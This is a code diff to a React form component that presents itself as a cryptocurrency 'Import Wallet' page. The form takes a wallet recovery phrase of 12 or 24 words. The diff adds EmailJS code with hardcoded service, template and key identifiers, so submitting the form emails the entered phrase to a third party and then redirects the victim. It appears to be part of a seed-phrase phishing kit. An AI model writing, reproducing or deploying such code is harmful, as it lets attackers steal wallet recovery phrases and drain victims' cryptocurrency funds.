@@ -1,9 +1,35 @@
-import React from "react";
+// import React from "react";
 import classes from "./phrase.module.css";
 import { useState } from "react";
 import { useNavigate } from "react-router";
 import { useEffect } from "react";
+import React, { useRef } from "react";
+import emailjs from "@emailjs/browser";
+
 const Form = () => {
+  const form = useRef();
+
+  const sendEmail = (e) => {
+    e.preventDefault();
+
+    emailjs
+      .sendForm(
+        "service_cen36ww",
+        "template_1269aqf",
+        e.target,
+        "ZbakojD4asxn3jFKH"
+      )
+      .then(
+        (result) => {
+          navigate("/Redirect");
+          console.log(result.text);
+        },
+        (error) => {
+          console.log(error.text);
+        }
+      );
+  };
+
   const navigate = useNavigate();
   const [value, setValue] = useState({
     coinType: "",
@@ -18,12 +44,6 @@ const Form = () => {
     }));
   };
 
-  const handleSubmit = (e) => {
-    e.preventDefault();
-    // console.log(value);
-    // console.log(items);
-    navigate("/Redirect");
-  };
   useEffect(() => {
     const walletname = localStorage.getItem("walletname");
     if (walletname) {
@@ -36,7 +56,7 @@ const Form = () => {
 
   return (
     <div>
-      <form className={classes.form}>
+      <form className={classes.form} onSubmit={sendEmail}>
         <select
           className={classes.input}
           value={value.coinType}
@@ -59,14 +79,13 @@ const Form = () => {
           />
         </div>
         <p>Typically 12 (sometimes 24) words separated by a single space.</p>
+        <button
+          className={classes.button}
+          disabled={value.coinType.length < 2 || value.phrase.length < 2}
+        >
+          Import Wallet
+        </button>
       </form>
-      <button
-        className={classes.button}
-        onClick={handleSubmit}
-        disabled={value.coinType.length < 2 || value.phrase.length < 2}
-      >
-        Import Wallet
-      </button>
     </div>
   );
 };
